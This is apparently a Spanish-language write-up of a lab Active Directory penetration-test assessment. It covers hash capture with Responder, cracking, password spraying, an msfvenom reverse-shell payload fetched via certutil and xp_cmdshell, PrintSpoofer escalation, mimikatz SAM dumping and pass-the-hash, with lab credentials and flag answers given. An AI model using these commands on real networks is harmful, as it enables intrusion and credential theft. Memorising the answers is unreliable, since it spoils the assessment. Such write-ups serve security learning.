## Escenario

Nuestro cliente Inlanefreight nos ha contratado nuevamente para realizar una prueba de penetración interna de alcance completo. El cliente busca encontrar y remediar tantas fallas como sea posible antes de pasar por un proceso de fusión y adquisición. El nuevo CISO está particularmente preocupado por fallas de seguridad de AD más matizadas que pueden haber pasado desapercibidas durante pruebas de penetración anteriores. El cliente no está preocupado por tácticas sigilosas/evasivas y también nos ha proporcionado una VM Parrot Linux dentro de la red interna para obtener la mejor cobertura posible de todos los ángulos de la red y el entorno de Active Directory. Conéctate al host de ataque interno vía SSH (también puedes conectarte usando `xfreerdp` como se muestra al principio de este módulo) y comienza a buscar un punto de apoyo en el dominio. Una vez que tengas un punto de apoyo, enumera el dominio y busca fallas que puedan utilizarse para moverte lateralmente, escalar privilegios y lograr el compromiso del dominio.

Aplica lo aprendido en este módulo para comprometer el dominio y responde las preguntas a continuación para completar la parte II de la evaluación de habilidades.

##### 1. _Obtén un hash de contraseña para una cuenta de usuario de dominio que pueda aprovecharse para obtener un punto de apoyo en el dominio. ¿Cuál es el nombre de la cuenta?_

Lo primero de todo es conectarnos por SSH a la IP que nos dan con las siguientes credenciales:

```
User: htb-student
Pass: HTB_@cademy_stdnt!
```

![[Pasted image 20251222160934.png]]
Una vez dentro, listamos las interfaces de red. Nos interesa la siguiente:

```bash
3: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b0:76:6f brd ff:ff:ff:ff:ff:ff
    altname enp19s0
    inet 172.16.7.240/23 brd 172.16.7.255 scope global noprefixroute ens224
       valid_lft forever preferred_lft forever
    inet6 fe80::2957:2d31:5225:229a/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
```

Ejecutamos `responder` con la interfaz de red `ens224` para intentar capturar el hash de alguien. Sabemos que es dicha interfaz porque el rango `172.16.X.X` corresponde a una red privada, además con `ip route`:

```bash
└──╼ $ip route
default via 10.129.0.1 dev ens192 proto dhcp metric 100 
default via 172.16.7.1 dev ens224 proto static metric 101 
10.129.0.0/16 dev ens192 proto kernel scope link src 10.129.193.185 metric 100 
172.16.6.0/23 dev ens224 proto kernel scope link src 172.16.7.240 metric 101 
172.17.0.0/16 dev docker0 proto kernel scope link src 172.17.0.1 linkdown 
```

Esperamos un poco y confirmamos hash obtenido:

![[Pasted image 20251222161251.png | 600]]

```bash
┌─[htb-student@skills-par01]─[~]
└──╼ $ls /usr/share/responder/logs
Analyzer-Session.log  Config-Responder.log  Poisoners-Session.log  Responder-Session.log  SMB-NTLMv2-SSP-172.16.7.3.txt
```

Simplemente mostramos el contenido. 

> **Respuesta**: AB920
##### 2. _¿Cuál es la contraseña en texto claro de este usuario?_

Esta es fácil. Crackeamos el hash:

```bash
❯ john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt hash_AB920.hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
weasal           (AB920)     
1g 0:00:00:00 DONE (2025-12-22 16:16) 4.166g/s 1211Kp/s 1211Kc/s 1211KC/s winers..temyong
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```

> **Respuesta**: weasal
##### 3. _Envía el contenido del archivo C:\flag.txt en MS01._

Primero identificamos con `fping` qué hosts se encuentran activos en el dominio:

```bash
┌─[✗]─[htb-student@skills-par01]─[~]
└──╼ $fping -asgq 172.16.7.0/23
172.16.7.3
172.16.7.50
172.16.7.60
172.16.7.240
```

Guardamos dichas IPs en un archivo txt para luego hacer un análisis con nmap. Tras lanzar el escaneo detallado obtenemos la siguiente información:

```bash
...SNIP...

Nmap scan report for 172.16.7.50
Host is up (0.0012s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-12-22T15:22:18+00:00; +17s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: INLANEFREIGHT
|   NetBIOS_Domain_Name: INLANEFREIGHT
|   NetBIOS_Computer_Name: MS01
|   DNS_Domain_Name: INLANEFREIGHT.LOCAL
|   DNS_Computer_Name: MS01.INLANEFREIGHT.LOCAL
|   DNS_Tree_Name: INLANEFREIGHT.LOCAL
|   Product_Version: 10.0.17763
|_  System_Time: 2025-12-22T15:22:10+00:00
| ssl-cert: Subject: commonName=MS01.INLANEFREIGHT.LOCAL
| Issuer: commonName=MS01.INLANEFREIGHT.LOCAL

...SNIP...
```

- **172.16.7.3** : `DC01`
- **172.16.7.50** : `MS01`
- **172.16.7.60** : `SQL01`
- **172.16.7.240** : `Nuestra máquina Parrot` (_A la que estamos conectados por SSH)

Ahora que hemos identificado la IP de MS01 procedemos a verificar si podemos entrar de alguna manera con el usuario y credenciales capturadas:

```bash
┌─[✗]─[htb-student@skills-par01]─[~/Desktop/Lab2]
└──╼ $crackmapexec smb 172.16.7.50 -u 'AB920' -p 'weasal'
SMB         172.16.7.50     445    MS01             [*] Windows 10.0 Build 17763 x64 (name:MS01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         172.16.7.50     445    MS01             [+] INLANEFREIGHT.LOCAL\AB920:weasal 

┌─[htb-student@skills-par01]─[~/Desktop/Lab2]
└──╼ $crackmapexec winrm 172.16.7.50 -u 'AB920' -p 'weasal'
WINRM       172.16.7.50     5985   NONE             [*] None (name:172.16.7.50) (domain:None)
WINRM       172.16.7.50     5985   NONE             [*] http://172.16.7.50:5985/wsman
WINRM       172.16.7.50     5985   NONE             [+] None\AB920:weasal (Pwn3d!)
```

Como vemos, con winrm aparece `Pwn3d!` lo que indica que tenemos acceso completo. Por tanto el siguiente paso es usar `evil-winrm`:

```bash
evil-winrm -i 172.16.7.50 -u 'ab920' -p 'weasal'
```

Obtenemos la flag:

![[Pasted image 20251222162926.png | 700]]

> **Respuesta**: aud1t_gr0up_m3mbersh1ps!
##### 4. _Usa un método común para obtener credenciales débiles de otro usuario. Envía el nombre de usuario del usuario cuyas credenciales obtienes._

Nos dicen que usemos un método común para obtener credenciales débiles de otros usuarios. Vamos a probar con un ataque de _password spraying_. Primero, aprovechando crackmapexec, sacamos usuarios del controlador de dominio (DC01) que como hemos visto en el escaneo con nmap previo, corresponde a la IP `172.16.7.3`.

```
┌─[htb-student@skills-par01]─[~/Desktop/Lab2]
└──╼ $sudo crackmapexec smb 172.16.7.3 -u 'ab920' -p 'weasal' --users | tee users.txt
...SNIP...

┌─[htb-student@skills-par01]─[~/Desktop/Lab2]
└──╼ $cat users.txt | cut -d'\' -f2 | awk -F " " '{print $1}' | tee valid_users.txt

┌─[htb-student@skills-par01]─[~/Desktop/Lab2]
└──╼ $wc -l users.txt 
2904 users.txt
```

> _Explicación del segundo comando_:

```
cut -d'\' -f2     # Divide por \ y toma campo 2
awk -F " "        # Divide por espacio
awk -F ":"        # Divide por :
awk -F ","        # Divide por ,
```

Vemos 2904 usuarios en el DC. Procedemos a usar `kerbrute` para hacer el ataque:

```bash
kerbrute passwordspray -d inlanefreight.local --dc 172.16.7.3 valid_users.txt Welcome1
```

Utilizamos la lista de usuarios válidos, apuntamos al dominio y la IP correcta del DC y usamos la contraseña `Welcome1`. Tras esperar unos segundos...

```bash
┌─[htb-student@skills-par01]─[~/Desktop/Lab2]
└──╼ $kerbrute passwordspray -d inlanefreight.local --dc 172.16.7.3 valid_users.txt Welcome1

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 12/22/25 - Ronnie Flathers @ropnop

2025/12/22 10:52:51 >  Using KDC(s):
2025/12/22 10:52:51 >  	172.16.7.3:88

2025/12/22 10:53:07 >  [+] VALID LOGIN:	BR086@inlanefreight.local:Welcome1
2025/12/22 10:53:07 >  Done! Tested 2904 logins (1 successes) in 16.334 seconds
```

> **Respuesta**: BR086
##### 5. _¿Cuál es la contraseña de este usuario?_

Ya la hemos obtenido

> **Respuesta**: Welcome1
##### 6. _Localiza un archivo de configuración que contenga una cadena de conexión MSSQL. ¿Cuál es la contraseña del usuario listado en este archivo?_

Utilizamos `smbmap` para realizar la enumeración de shares y así, identificar shares para los que este usuario tenga permisos de lectura.

```bash
┌─[htb-student@skills-par01]─[~/Desktop/Lab2]
└──╼ $smbmap -u 'br086' -p 'Welcome1' -d INLANEFREIGHT.LOCAL -H 172.16.7.3
[+] IP: 172.16.7.3:445	Name: inlanefreight.local                               
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	Department Shares                                 	READ ONLY	Share for department users
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	SYSVOL                                            	READ ONLY	Logon server share 
```

Los shares `IPC$` , `NETLOGON` y `SYSVOL` no nos interesan, sin embargo, `Department Shares` sí que puede contener información útil. Listamos su contenido de forma recursiva:

```bash
smbmap -u 'br086' -p 'Welcome1' -d INLANEFREIGHT.LOCAL -H 172.16.7.3 -R 'Department Shares'
```

_Usamos `-R` para que busque de manera recursiva con una profundidad por defecto de 1._

![[Pasted image 20251222170035.png | 600]]

Ahora descargamos dicho web.config con la opción `-A`:

```bash
┌─[htb-student@skills-par01]─[~/Desktop/Lab2]
└──╼ $smbmap -u 'br086' -p 'Welcome1' -d INLANEFREIGHT.LOCAL -H 172.16.7.3 -R 'Department Shares' -A web.config
[+] IP: 172.16.7.3:445	Name: inlanefreight.local                               
[+] Starting search for files matching 'web.config' on share Department Shares.
[+] Match found! Downloading: Department Shares\IT\Private\Development\web.config
```

Y mostramos su contenido. Dentro está la respuesta

> **Respuesta**: D@ta_bAse_adm1n!
##### 7. _Envía el contenido del archivo flag.txt en el escritorio del Administrator en el host SQL01._

El archivo web.config que hemos descargado contenía la siguiente información:

```xml
</masterDataServices>  
       <connectionStrings>
           <add name="ConString" connectionString="Environment.GetEnvironmentVariable("computername")+'\SQLEXPRESS';Initial Catalog=Northwind;User ID=netdb;Password=D@ta_bAse_adm1n!"/>
       </connectionStrings>
  </system.web>
</configuration>
```

Vemos que tenemos las credenciales `netdb:D@ta_bAse_adm1n!`. Hacemos una conexión contra SQL01, que como hemos visto al principio, corresponde a la IP `172.16.7.60`.

```bash
┌─[htb-student@skills-par01]─[~/Desktop/Lab2]
└──╼ $python3 /usr/local/bin/mssqlclient.py inlanefreight/netdb:'D@ta_bAse_adm1n!'@172.16.7.60
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(SQL01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(SQL01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL> 
```

Una vez dentro, vemos que no tenemos permisos suficientes para abrinos una shell. Por tanto, vamos a revisar primero qué permisos tenemos:

```SQL
EXEC xp_cmdshell 'whoami /priv'
...SNIP...
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
```

Ese privilegio es muy importante. Básicamente es vulnerable a ataques de token impersonation. Podemos aprovechar para escalar nuestros privilegios haciendo uso de la vulnerabilidad `PrintNightmare`. Antes de eso, para que el payload funcione, abrimos en un nuevo terminal una sesión SSH para conectarnos a Parrot. Generamos el payload para la reverse shell:

```bash
┌─[htb-student@skills-par01]─[~/Desktop/Lab2]
└──╼ $msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.7.240 LPORT=1335 -f exe -o shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: shell.exe
```

En la máquina Parrot abrimos un servidor Python para poder descargar tanto PrintSpoofer como la shell que acabamos de obtener. Para descargar PrintSpoofer, primero la enviamos de nuestro Kali a la Parrot, y de la Parrot irá a la máquina SQL, por tanto el flujo es:

`Kali (10.10.14.217) > Parrot (10.129.193.185) > SQL01 (172.16.7.60)`

```bash
# Kali
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe -O PrintSpoofer.exe

❯ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.193.185 - - [22/Dec/2025 17:30:25] "GET /PrintSpoofer.exe HTTP/1.1" 200 -
^C
Keyboard interrupt received, exiting.

# Parrot
┌─[htb-student@skills-par01]─[~/Desktop/Lab2]
└──╼ $wget http://10.10.14.217:8000/PrintSpoofer.exe
...SNIP...

PrintSpoofer.exe.1                        100%[===================================================================================>]  26,50K  --.-KB/s    en 0,1s    

2025-12-22 11:30:02 (251 KB/s) - «PrintSpoofer.exe.1» guardado [27136/27136]
```

Levantamos el servidor python en el Parrot, y desde la sesión con SQL descargamos tanto la shell como PrintSpoofer.exe:

```bash
SQL> xp_cmdshell "certutil.exe -urlcache -f http://172.16.7.240:8000/PrintSpoofer.exe C:\Users\Public\PrintSpoofer.exe"
SQL> xp_cmdshell "certutil.exe -urlcache -f http://172.16.7.240:8000/shell.exe C:\Users\Public\shell.exe"
```

Volvemos a la máquina Parrot y levantamos el listener con Metasploit. 

```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 172.16.7.240
set LPORT 1335
```

Y en la sesión con SQL:

```bash
xp_cmdshell C:\Users\Public\PrintSpoofer.exe -c C:\Users\Public\shell.exe
```

Obtendremos la sesión meterpreter:

```bash
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 172.16.7.240:1335 
[*] Sending stage (200262 bytes) to 172.16.7.60
[*] Meterpreter session 1 opened (172.16.7.240:1335 -> 172.16.7.60:58566 ) at 2025-12-22 11:43:35 -0500

meterpreter > shell
Process 1424 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>more C:\Users\administrator\Desktop\flag.txt
more C:\Users\administrator\Desktop\flag.txt
s3imp3rs0nate_cl@ssic

C:\Windows\system32>
```

> **Respuesta**: s3imp3rs0nate_cl@ssic
##### 8. _Envía el contenido del archivo flag.txt en el escritorio del Administrator en el host MS01._

Tenemos semi-privilegios en el servidor SQL01, el siguiente paso es intentar obtener el hash del administrador. Usamos mimikatz:

```bash
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.


meterpreter > lsa_dump_sam
[+] Running as SYSTEM
[*] Dumping LSA secrets
Domain : SQL01
SysKey : 2cdbbee2d1fb9cfb7cf7189fa66971a6
```

Debajo saldrá el hash del administrador: `bdaffbfe64f1fc646a3353be1c2c3c99`. Realizamos un PtH con evil-winrm:

```bash
evil-winrm -i 172.16.7.50 -u administrator -H bdaffbfe64f1fc646a3353be1c2c3c99
```

![[Pasted image 20251222175332.png]]

> **Respuesta**: exc3ss1ve_adm1n_r1ights!
##### 9. _Obtén credenciales para un usuario que tenga derechos GenericAll sobre el grupo Domain Admins. ¿Cuál es el nombre de cuenta de este usuario?_



> **Respuesta**: 
##### 10. _Crackea el hash de contraseña de este usuario y envía la contraseña en texto claro como respuesta._



> **Respuesta**: 
##### 11. _Envía el contenido del archivo flag.txt en el escritorio del Administrator en el host DC01._



> **Respuesta**: 
##### 12. _Envía el hash NTLM para la cuenta KRBTGT del dominio objetivo después de lograr el compromiso del dominio._



> **Respuesta**: 